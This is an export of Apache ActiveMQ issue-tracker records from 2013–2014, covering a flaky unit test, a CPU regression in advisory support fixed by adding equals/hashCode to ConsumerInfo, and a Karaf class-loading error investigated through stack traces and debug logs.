	at junit.framework.TestResult$1.protect(TestResult.java:122)
	at junit.framework.TestResult.runProtected(TestResult.java:142)
	at junit.framework.TestResult.run(TestResult.java:125)
	at junit.framework.TestCase.run(TestCase.java:129)
	at junit.framework.TestSuite.runTest(TestSuite.java:255)
	at junit.framework.TestSuite.run(TestSuite.java:250)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)
	at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164)
	at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110)
	at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175)
	at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
Caused by: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://localhost#5) stopped.
	at org.apache.activemq.transport.vm.VMTransport.stop(VMTransport.java:205)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
	at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132)
	at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:1071)
	at org.apache.activemq.broker.TransportConnection$4.run(TransportConnection.java:1037)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:722)
",,kearls,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,357359,,,Fri Feb 14 16:36:13 UTC 2014,,,,,,,,,,,"0|i1plsv:",357649,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"07/Nov/13 12:50;kearls;Increased timeout in commit 982b728f24415513a18cb51097b5a10d2f9b66db;;;","14/Feb/14 16:36;kearls;This is still failing in a couple of places, most recently .testValidateRedeliveryCountOnRollback and testRedeliveryWithPrefetch1.  I've seen this in some other tests where it seems like broker.stop in tearDown() doesn't really wait for everything to shut down, even if you call waitUntilStopped.

All of the tests are fine if run alone.  I'll add a short sleep at the end of the tearDown() to take care of this.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Advisory support leads to excessive CPU usage,AMQ-4853,12677814,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,jwatkins,jwatkins,06/Nov/13 17:47,21/Jan/15 20:34,14/Jul/23 05:43,11/Nov/13 14:57,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"After upgrading from AMQ 5.8 to 5.9 we have seen cpu usage continually climb until AMQ threads are taking nearly all of the CPU Resources while remaining fairly idle. This is just a single broker with advisory support on. (Advisory support is on in this case as we run the same config for a network of brokers.) Turning off advisory support reduced the CPU load to single digits.

top -H output:
Cpu(s): 97.8%us,  2.1%sy,  0.0%ni,  0.0%id,  0.0%wa,  0.0%hi,  0.1%si,  0.0%st
Mem:   7872040k total,  6574324k used,  1297716k free,   301028k buffers
Swap:        0k total,        0k used,        0k free,  1635392k cached

  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                                                                                          
25476 root      16   0 2173m 891m  11m R 14.4 11.6  86:12.10 java                                                                                                                                              
25472 root      15   0 2173m 891m  11m R 13.6 11.6  86:09.77 java                                                                                                                                              
25155 root      16   0 2173m 891m  11m R  9.8 11.6  86:26.13 java                                                                                                                                              
25471 root      16   0 2173m 891m  11m R  9.2 11.6  86:12.93 java                                                                                                                                              
25514 root      16   0 2173m 891m  11m R  9.2 11.6  86:15.12 java                                                                                                                                              
25202 root      16   0 2173m 891m  11m R  8.7 11.6  86:33.20 java                                                                                                                                              
25189 root      16   0 2173m 891m  11m S  8.4 11.6  86:24.65 java                                                                                                                                              
25274 root      16   0 2173m 891m  11m R  8.1 11.6  86:18.45 java                                                                                                                                              
19272 root      15   0 2173m 891m  11m S  8.1 11.6   8:40.19 java                                                                                                                                              
20039 root      15   0 2173m 891m  11m S  8.1 11.6   8:15.53 java                                                                                                                                              
19270 root      15   0 2173m 891m  11m R  7.8 11.6   8:35.85 java                                                                                                                                              
25134 root      16   0 2173m 891m  11m R  7.5 11.6  90:42.29 java                                                                                                                                              
25259 root      15   0 2173m 891m  11m R  7.5 11.6  90:30.02 java                                                                                                                                              
25474 root      16   0 2173m 891m  11m R  7.5 11.6  86:13.24 java                                                                                                                                              
25475 root      16   0 2173m 891m  11m R  7.5 11.6  86:11.74 java                                                                                                                                              
25483 root      16   0 2173m 891m  11m R  7.5 11.6  86:12.30 java                                                                                                                                              
25210 root      15   0 2173m 891m  11m R  7.2 11.6  90:35.24 java                                                                                                                                              
25129 root      16   0 2173m 891m  11m S  6.9 11.6  90:31.27 java                                                                                                                                              
25249 root      16   0 2173m 891m  11m S  6.9 11.6  86:18.35 java                                                                                                                                              
25489 root      16   0 2173m 891m  11m R  6.9 11.6  86:16.93 java                                                                                                                                              
 9971 root      15   0 2173m 891m  11m S  6.6 11.6  38:53.66 java                                                                                                                                              
25116 root      16   0 2173m 891m  11m R  6.3 11.6  90:28.39 java                                                                                                                                              
25513 root      16   0 2173m 891m  11m R  6.3 11.6  86:07.62 java    


Thread dump snippets:

PID 25476 --
""ActiveMQ Transport: tcp:///10.33.154.95:48799@61616"" daemon prio=10 tid=0x00002aaaf5288800 nid=0x6384 runnable [0x00000000489b1000]
   java.lang.Thread.State: RUNNABLE
	at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:619)


PID - 25473
""ActiveMQ Transport: tcp:///10.33.154.95:48802@61616"" daemon prio=10 tid=0x00002aaaf6afc800 nid=0x6381 runnable [0x000000004779f000]
   java.lang.Thread.State: RUNNABLE
	at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:619)


PID 25471 --
""ActiveMQ Transport: tcp:///10.33.154.95:48803@61616"" daemon prio=10 tid=0x00002aaaf6f4b800 nid=0x6380 runnable [0x00000000487af000]
   java.lang.Thread.State: RUNNABLE
	at java.util.concurrent.ConcurrentLinkedQueue.remove(ConcurrentLinkedQueue.java:346)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:270)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:132)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:137)
	at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:619)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:619)



",,joef,jwatkins,paulgale,rajdavies,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Nov/13 11:01;jwatkins;amqAdvirsoryCPUIssue.jpg;https://issues.apache.org/jira/secure/attachment/12612811/amqAdvirsoryCPUIssue.jpg",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,357189,,,Wed Jan 21 20:34:35 UTC 2015,,,,,,,,,,,"0|i1pkr3:",357479,Regression,,,,,,,,,,,,,,,,,,,,"07/Nov/13 15:52;tabish;You should investigate why all the consumers are coming and going so often.  ;;;","07/Nov/13 16:15;jwatkins;I am. But it is worrying that Activemq 5.9 seemingly can't handle the consumers coming and going in the same way as 5.8. Also, it isn't just that the CPU usage is higher but that it continually grows. 

I am also looking over the changes from 5.8 to 5.9 in case something jumps out.;;;","07/Nov/13 17:05;jwatkins;Timothy,

I just had a look at the code and I believe I see what the issue is. The change you made[1] moving the consumers hashmap to a queue is causing the performance issue. We have quite a few consumers so on remove we would have to potentially traverse all the consumers to remove the one. 

As far as our code we do use camel with maxConsumers settings and request reply messages. So I would expect a bit of churn when it comes consumers coming and going.

1. https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commitdiff;h=74dafd7f24028c3503758581166ec10bb3d5116a;;;","07/Nov/13 17:29;tabish;The code that was there, using the map was completely broken so the Queue was used instead.  If you want to create a test case that shows how this impacts performance we can look to try and improve things however the basic functionality needs to stand as it resolves issues with replaying advisories over a network in the correct order.  ;;;","08/Nov/13 07:01;rajdavies;LinkedHashMap may be the way to go on this one;;;","08/Nov/13 11:01;jwatkins;+1 Rob.

Tim,
I will try to come up with a stress test for this code. Attached is a Profiling session when the cpu was at nearly 100% usage to show just how badly it is performing. (Note: we were not seeing such CPU usage issues in 5.8.);;;","08/Nov/13 18:01;jwatkins;After doing a bit more research I think the issue is a bit more fundamental than simply using the Queue vs a Map. (The queue implementation definitely makes it worse.) I have been looking at the profiling information more and doing a few tests. I see that the queue is continually growing. Digging a bit deeper I see that the ConsumerInfo class does not have an equals method. Without an equals method the consumers.remove() call in AdvisoryBroker.removeConsumer is pretty useless if we ever create another consumer info object - which I believe to be the case.;;;","08/Nov/13 18:39;jwatkins;For completeness a unit test:
{code}
  public void testEqualsNeeded() throws Exception{
    	  //setup
    	  AdvisoryBroker testObj = (AdvisoryBroker) broker.getBroker().getAdaptor(
      			AdvisoryBroker.class);
    	  ActiveMQDestination destination = new ActiveMQQueue(""foo"");
          ConnectionInfo connectionInfo = createConnectionInfo();
          ConnectionContext connectionContext =  new ConnectionContext(connectionInfo);
          connectionContext.setBroker(broker.getBroker());
          SessionInfo sessionInfo = createSessionInfo(connectionInfo);
          ConsumerInfo consumerInfo = createConsumerInfo(sessionInfo, destination);
          
          testObj.addConsumer(connectionContext, consumerInfo);
          ConsumerInfo duplicateConsumer = consumerInfo.copy();
          
          //act
          testObj.removeConsumer(connectionContext, duplicateConsumer);
          
          
          //assert
          assertEquals(0, testObj.getAdvisoryConsumers().size()); 
    }

{code};;;","08/Nov/13 19:19;tabish;Yes, there's definitely some issues to tackle. Can you attach you test as a complete Java source file?  ;;;","08/Nov/13 21:08;tabish;I've added the appropriate equals and hashCode overrides on trunk for ConsumerInfo which when run with this test reduces the time from 182 seconds to 2 seconds.  

{code}
    @Test
    public void testEqualsNeeded() throws Exception {
        // setup
        AdvisoryBroker testObj = (AdvisoryBroker) brokerService.getBroker().getAdaptor(AdvisoryBroker.class);
        ActiveMQDestination destination = new ActiveMQQueue(""foo"");
        ConnectionInfo connectionInfo = createConnectionInfo();
        ConnectionContext connectionContext = new ConnectionContext(connectionInfo);
        connectionContext.setBroker(brokerService.getBroker());
        SessionInfo sessionInfo = createSessionInfo(connectionInfo);

        long start = System.currentTimeMillis();

        for (int i = 0; i < 100; ++i) {

            for (int j = 0; j < 1000; j++) {
                ConsumerInfo consumerInfo = createConsumerInfo(sessionInfo, i, destination);
                testObj.addConsumer(connectionContext, consumerInfo);
                ConsumerInfo duplicateConsumer = consumerInfo.copy();
                testObj.removeConsumer(connectionContext, duplicateConsumer);
            }
        }

        long finish = System.currentTimeMillis();

        long totalTime = finish - start;

        LOG.info(""Total test time: {} seconds"", TimeUnit.MILLISECONDS.toSeconds(totalTime));

        // assert
        // assertEquals(0, testObj.getAdvisoryConsumers().size());
    }
{code};;;","11/Nov/13 11:09;jwatkins;Timothy, Thanks for that. I am on GMT and missed the message. Can we get this patched in 5.9 with a new release? ;;;","11/Nov/13 14:57;tabish;Fixed on trunk, will appear in the next release.  ;;;","11/Nov/13 17:23;jwatkins;Is there no possibility of getting this ported to the 5.9 and getting a 5.9.1 release? (Perhaps folding in a fix for the ""Leveldb being corrupted in a cluster"" for 5.9.1? [1]) As 5.9 just came out, then trunk would not be released for another ~6 months. This is a pretty long time to go with Advisory support and therefore broker networks being effectively broken (unless they are statically configured). Furthermore this is worse than a normal memory leak because the CPU will eventually become pegged.


1. https://issues.apache.org/jira/browse/AMQ-4837;;;","21/Jan/15 20:34;joef;Also see https://issues.apache.org/jira/browse/AMQ-5337;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NoClassDefFoundError: javax/net/ssl/SSLServerSocket (in Karaf),AMQ-4850,12677617,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,jbonofre,amichai,amichai,05/Nov/13 18:23,26/Jun/14 08:53,14/Jul/23 05:43,26/Jun/14 08:53,5.9.0,,,,,5.10.0,,,OSGi/Karaf,,,,1,,,,,,,,,"I couldn't find a way to recreate this consistently, but after repeating several times the following steps reproduce it:

1. Install custom Karaf 2.3.3 from scratch. Customizations include installing the activemq-broker feature using the featuresBoot configuration (along with a couple other unrelated features), and a dozen or so of my application's bundles in the deploy folder.

2. Start Karaf - everything works fine.

3. Shut down Karaf.

4. Touch my application's 'common' bundle (in deploy folder). The other application bundles depend on this one. This is *not* the bundle that uses ActiveMQ.

5. Start Karaf - it first starts all the app bundles (the old version I think), then it picks up the modified bundle timestamp and restarts the app bundles in what appears to be arbitrary order. This usually works, but once in a while the app's 'bus' bundle (which connects to ActiveMQ) fails to start with this exception showing up in the logs.

6. Interestingly, restarting the app or activemq bundles, or even restarting Karaf itself, doesn't fix things - once it enters this invalid state, it seems to stay stuck in it and continues with the same exception and with the app unable to connect to ActiveMQ. However, if I shut down Karaf and once again touch my app's 'common' bundle in the deploy folder and then start up Karaf again, it restarts the app bundles and this time everything goes back to normal, with a successful connection to ActiveMQ. So it looks like while the first occurrence is not recreated consistently, this state is not just a runtime thing but remains persisted somehow for as long as the app bundle files aren't modified.

Here is the stack trace:

java.lang.NoClassDefFoundError: javax/net/ssl/SSLServerSocket
        at org.apache.activemq.util.IntrospectionSupport.setProperty(IntrospectionSupport.java:163)
        at org.apache.activemq.util.IntrospectionSupport.setProperties(IntrospectionSupport.java:151)
        at org.apache.activemq.transport.failover.FailoverTransportFactory.createTransport(FailoverTransportFactory.java:74)
        at org.apache.activemq.transport.failover.FailoverTransportFactory.createTransport(FailoverTransportFactory.java:63)
        at org.apache.activemq.transport.failover.FailoverTransportFactory.doConnect(FailoverTransportFactory.java:38)
        at org.apache.activemq.transport.TransportFactory.connect(TransportFactory.java:64)
        at org.apache.activemq.ActiveMQConnectionFactory.createTransport(ActiveMQConnectionFactory.java:258)
        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)
        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:246)
        at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:186)
...
","Oracle JDK 7u45, Karaf 2.3.3 with activemq-broker installed from 5.9.0 feature",amichai,fbalicchia,ggrzybek,jbonofre,pberkman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,356992,,,Thu Jun 26 08:53:18 UTC 2014,,,,,,,,,,,"0|i1pjjr:",357282,,,,,,,,,,,,,,,,,,,,,"03/Dec/13 05:35;ggrzybek;Hello Amichai

I have done several iterations of your scenario without success (I mean without {{NoClassDefFoundError}} :)). Tell me:
* what are your dependencies ({{Import-Package}} or {{Require-Bundle}})?
* does your {{common}} or {{bus}} bundle import ({{Import-Package}}) {{javax.net.ssl}} package?
* what is your ActiveMQ connection URL (I've tested {{failover:(vm://localhost)}}).
* (_optional_) how did you manage to install {{activemq-broker}} feature without patching {{KARAF/system/org/ops4j/pax/url/pax-url-mvn/1.3.6/pax-url-mvn-1.3.6.jar}} (see: https://ops4j1.jira.com/browse/BASE-48)

regards
Grzegorz Grzybek;;;","03/Dec/13 09:01;amichai;The imports/exports are below. Nothing imports or uses javax.net.ssl directly (the string ""javax.net"" doesn't appear anywhere in the project, actually), that's only in the ActiveMQ bundle.

The url is ""failover://(tcp://localhost:61616)?startupMaxReconnectAttempts=10"", though iirc it's the same error with only ""tcp://localhost:61616"" (in 5.8.0 the exception was masked when using failover url and could only be seen with a debug breakpoint in the ActiveMQ code, and only when using the tcp url directly was this exception printed to the logs. In 5.9.0 it is no longer being swallowed so the full exception is logged with either url).

I don't know about that pax url bug - I just install the feature and it works. Maybe, as the related bug (KARAF-2536) suggests, I already had the library in the local maven repo, or maybe it's because I'm creating an offline custom karaf distribution and the maven plugin manages to get the problematic library at build time and it would only fail if karaf tried fetching it at runtime.


The imports/exports (copied form manifests and manually edited to be more readable here):

common bundle:
{quote}
Import-Package:
 javax.xml.bind.annotation,org.osgi.framework;version=""[1.6,2)"",
 org.osgi.service.blueprint.container;version=""[1.0,2)"",
 org.slf4j;version=""[1.7,2)""
Export-Package:
 com.myproject.common.core;version=""0.1.0.SNAPSHOT"";uses:=""javax.xml.bind.annotation"",
 com.myproject.common.framework;version=""0.1.0.SNAPSHOT"";uses:=""com.myproject.common.util,org.osgi.framework"",
 com.myproject.common.util;version=""0.1.0.SNAPSHOT""
{quote}

bus bundle:
{quote}
Import-Package:
 com.myproject.bus.api;version=""[0.1,1)"",
 com.myproject.common.core;version=""[0.1,1)"",
 com.myproject.common.framework;version=""[0.1,1)"",
 com.myproject.common.util;version=""[0.1,1)"",
 com.myproject.messaging.api;version=""[0.1,1)"",
 com.myproject.messaging.jms;version=""[0.1,1)"",
 javax.jms;version=""[1.1,2)"",
 org.apache.activemq,org.osgi.service.blueprint;version=""[1.0.0,2.0.0)"",
 org.slf4j;version=""[1.7,2)""
Export-Package:
 com.myproject.bus.api;version=""0.1.0.SNAPSHOT"";uses:=""com.myproject.common.core""
{quote}

messaging bundle:
{quote}
Import-Package:
 com.myproject.common.core;version=""[0.1,1)"",
 com.myproject.common.util;version=""[0.1,1)"",
 javax.jms;version=""[1.1,2)"",
 org.slf4j;version=""[1.7,2)""
Export-Package:
 com.myproject.messaging.api;version=""0.1.0.SNAPSHOT"";uses:=""com.myproject.common.core"",
 com.myproject.messaging.jms;version=""0.1.0.SNAPSHOT"";uses:=""com.myproject.common.core,javax.jms""
{quote}
;;;","03/Dec/13 10:43;ggrzybek;Still no {{NoClassDefFoundError}}.
Try adding:
{noformat}
felix.log.level=4
{noformat}
at the bottom of {{KARAF/etc/system.properties}} - there should be nice result of {{org.apache.felix.framework.BundleWiringImpl.diagnoseClassLoadError()}} invocation.;;;","03/Dec/13 13:27;amichai;I added the log level config, and everything looks the same. I did notice that the first time the exception is printed there is an additional 'caused by' trace, though this may have been there before the log change (subsequent stack traces don't show it). Is there anything in particular I should be looking for?

java.lang.NoClassDefFoundError: javax/net/ssl/SSLServerSocket
        at org.apache.activemq.util.IntrospectionSupport.setProperty(IntrospectionSupport.java:163)
        at org.apache.activemq.util.IntrospectionSupport.setProperties(IntrospectionSupport.java:151)
        at org.apache.activemq.transport.failover.FailoverTransportFactory.createTransport(FailoverTransportFactory.java:74)
        at org.apache.activemq.transport.failover.FailoverTransportFactory.createTransport(FailoverTransportFactory.java:63)
        at org.apache.activemq.transport.failover.FailoverTransportFactory.doConnect(FailoverTransportFactory.java:38)
        at org.apache.activemq.transport.TransportFactory.connect(TransportFactory.java:64)
        at org.apache.activemq.ActiveMQConnectionFactory.createTransport(ActiveMQConnectionFactory.java:258)
        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)
        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:246)
        at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:186)
        at com.myproject.bus.activemq.ActiveMQSession.createConnection(ActiveMQSession.java:33)
        at com.myproject.messaging.jms.Session.open(Session.java:71)[239:com.myproject.messaging:0.1.0.SNAPSHOT]
        at com.myproject.messaging.jms.Session$1.run(Session.java:109)[239:com.myproject.messaging:0.1.0.SNAPSHOT]
        at java.lang.Thread.run(Thread.java:744)[:1.7.0_45]
Caused by: java.lang.ClassNotFoundException: javax.net.ssl.SSLServerSocket
        at org.eclipse.osgi.internal.loader.BundleLoader.findClassInternal(BundleLoader.java:501)[osgi-3.8.0.v20120529-1548.jar:]
        at org.eclipse.osgi.internal.loader.BundleLoader.findClass(BundleLoader.java:421)[osgi-3.8.0.v20120529-1548.jar:]
        at org.eclipse.osgi.internal.loader.BundleLoader.findClass(BundleLoader.java:412)[osgi-3.8.0.v20120529-1548.jar:]
        at org.eclipse.osgi.internal.baseadaptor.DefaultClassLoader.loadClass(DefaultClassLoader.java:107)[osgi-3.8.0.v20120529-1548
.jar:]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:358)[:1.7.0_45]
        ... 14 more;;;","04/Dec/13 05:57;ggrzybek;The stack trace is different than mine, because I've tested creating connection in the Bundle-Activator thread and {{javax.net.ssl.SSLServerSocket}} is correctly loaded by {{org.apache.felix.framework.ExtensionManager.ExtensionManagerWiring.getClassByDelegation(String)}} related to system bundle. Eventually this class is loaded using {{sun.misc.Launcher$AppClassLoader}}.

What you have is an attempt to connect to AMQ from custom thread, so my questions are:
* how do you create the thread?
* is this thread properly managed between bundle restarts?
* have you set thread's context class loader?
* where do you start the thread? (inside BundleActivator or in some bundle/service listener?)
* what bundle starts the thread (bus? messaging?);;;","04/Dec/13 07:14;ggrzybek;The same situation (no NCDFE) with the {{new Thread().start()}} case... So could you share your thread-related code?;;;","04/Dec/13 08:05;ggrzybek;And something else is different from my default configuration. In your case there's {{org.eclipse.osgi.internal.baseadaptor.DefaultClassLoader}} involved - for me it is {{org.apache.felix.framework.BundleWiringImpl.BundleClassLoaderJava5}}. {{DefaultClassLoader}} seem to be used in special circumstances..;;;","04/Dec/13 08:52;amichai;I'm running with Equinox rather than Felix as the OSGi engine in Karaf, which might explain the different classloaders, and maybe the issue only happens with one and not the other. I'm using Equinox since I've hit some other unrelated issues using Felix, and in any case ActiveMQ should work with both.

As for the threading:
- The messaging bundle has an abstract Session class that does a simple new Thread(...) in it's init() method.
- The thread's ContextClassLoader is not modified.
- It has a corresponding destroy() method which interrupts and joins the thread, so I believe it is properly closed across bundle restarts.
- The whole Session implementation (and messaging bundle) uses clean JMS APIs, nothing AMQ-specific.
- The bus bundle has an ActiveMQSession subclass of Session.
- The ActiveMQSession is created in a blueprint configuration, which binds init-method to init() and destroy-method to destroy(). So that's basically the root of the thread's lifecycle.
- The subclass only overrides a createConnection() method for creating an AMQ-specific connection using ActiveMQConnectionFactory. It doesn't change or add anything else on top of Session.
- There is another bundle which similarly subclasses Session for creating Websphere MQ connections. It works properly, and is not running during these AMQ tests (I'm only mentioning it to explain the design which supports multiple MQ/JMS implementations via subclassing of Session in different bundles, and to show that it works ok with other provider implementations).

I hope I answered all the questions :-)

Thanks for taking the time to look into this!
;;;","04/Dec/13 09:39;ggrzybek;One more thing. Add these lines at the bottom of {{KARAF/etc/system.properties}}:
{noformat}
osgi.debug=etc/system.properties
org.eclipse.osgi/debug/loader=true
{noformat}

and run karaf with redirection to file (it will be HUGE), I got:
{noformat}
BundleClassLoader[org.apache.activemq.activemq-osgi_5.9.0].loadClass(javax.net.ssl.SSLServerSocket)
BundleLoader[org.apache.activemq.activemq-osgi_5.9.0].loadBundleClass(javax.net.ssl.SSLServerSocket)
{noformat};;;","08/Dec/13 17:20;amichai;Ok, got some interesting output. It looks like activemq-osgi finds the class properly:
{quote}
{noformat}
BundleClassLoader[org.apache.activemq.activemq-osgi_5.9.0].loadClass(javax.net.ssl.SSLServerSocket)
BundleLoader[org.apache.activemq.activemq-osgi_5.9.0].loadBundleClass(javax.net.ssl.SSLServerSocket)
{noformat}
{quote}
but a little further down the activemq-web-console bundle fails to find it. So now there are two issues - why if fails to load the class, and why this causes the broker itself not to run rather than only the web console.
{quote}
{noformat}
BundleClassLoader[org.apache.activemq.activemq-web-console_5.9.0].loadClass(javax.net.ssl.SSLServerSocket)
BundleLoader[org.apache.activemq.activemq-web-console_5.9.0].loadBundleClass(javax.net.ssl.SSLServerSocket)
BundleLoader[org.apache.activemq.activemq-web-console_5.9.0].findLocalClass(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/bundlefile].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/bundlefile].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/geronimo-jms_1.1_spec-1.1.1.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/geronimo-jta_1.0.1B_spec-1.0.1.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
